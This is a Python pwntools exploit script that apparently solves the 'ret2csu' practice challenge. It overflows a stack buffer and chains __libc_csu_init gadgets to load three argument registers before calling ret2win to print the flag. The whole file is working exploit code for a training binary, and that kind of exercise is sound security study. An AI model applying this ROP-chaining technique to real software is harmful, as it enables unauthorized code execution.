from pwn import *
from pprint import pprint
offset = 32

context.arch = 'x86_64'

elf = ELF("./ret2csu")
p = elf.process()
rop = ROP(elf)

# for debugging
# pprint(elf.symbols)

# uncomment next 3 lines to debug
#gdb.attach(p, gdbscript='''
##script
#break *pwnme+138
#break *ret2win
#break *__libc_csu_init+64
#''')

prompt = p.recvuntil(">")

buf = offset*b"B"
ebp = 8*b"C"

# want 0xdeadbeefdeadbeef in [rbp-0x14] = rdi
# want 0xcafebabecafebabe in [rbp-0x20] = rsi
# want 0xd00df00dd00df00d in [rbp-0x28] = rdx
pop_rdi = b"\xa3\x06\x40\x00\x00\x00\x00\x00"
# now, how to get something into rdx...
# after reading write-up on ret2csu, gona look in libc.so.6 for rop gadgets 
# (specifically, __libc_csu_init)

# in /lib/x86_64-linux-gnu/libc.so.6
# 0x000000000009eff8 : mov rdx, r12 ; pop r12 ; pop r13 ; ret
# gadget 1:
"""
   0x000000000040069a <+90>:	pop    rbx
   0x000000000040069b <+91>:	pop    rbp
   0x000000000040069c <+92>:	pop    r12
   0x000000000040069e <+94>:	pop    r13
   0x00000000004006a0 <+96>:	pop    r14
   0x00000000004006a2 <+98>:	pop    r15
   0x00000000004006a4 <+100>:	ret
"""
# gadget 2:
"""
   0x0000000000400680 <+64>:	mov    rdx,r15
   0x0000000000400683 <+67>:	mov    rsi,r14
   0x0000000000400686 <+70>:	mov    edi,r13d
   0x0000000000400689 <+73>:	call   QWORD PTR [r12+rbx*8]
"""
# gadget 3:
"""
pop rdi
"""

gadget1 = b'\x9a\x06\x40\x00\x00\x00\x00\x00'
gadget2 = b'\x80\x06\x40\x00\x00\x00\x00\x00'
gadget3 = pop_rdi
ret2win = p64(elf.symbols['ret2win'])
# nothing gadget is called from gadget2
nothing_gadget = p64(elf.symbols['_DYNAMIC'] + (16 * 4 + 8))        # addr of _fini is stored at offset 0x48 in _DYNAMIC segment


rop_chain = [
        buf,
        ebp,
        gadget1,
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbx 
        b'\x01\x00\x00\x00\x00\x00\x00\x00',    # rbp
        nothing_gadget,                         # r12
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r13
        b'\xbe\xba\xfe\xca\xbe\xba\xfe\xca',    # r14
        b'\x0d\xf0\x0d\xd0\x0d\xf0\x0d\xd0',    # r15
        gadget2,                                # call [r12 + rbx*8] should point to nothing_gadget, which will return to gadget2
        # add 1 to ebp, cmp to ebx
        # add 0x8 to esp
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # garbage
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbx
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # rbp
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r12
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r13
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r14
        b'\x00\x00\x00\x00\x00\x00\x00\x00',    # r15
        pop_rdi,
        b"\xef\xbe\xad\xde\xef\xbe\xad\xde",
        ret2win,
        ]

rop_chain = b"".join(rop_chain)
p.sendline(rop_chain)
p.recvline()
flag = p.recvline()
flag = flag.decode('UTF-8')
print(flag)
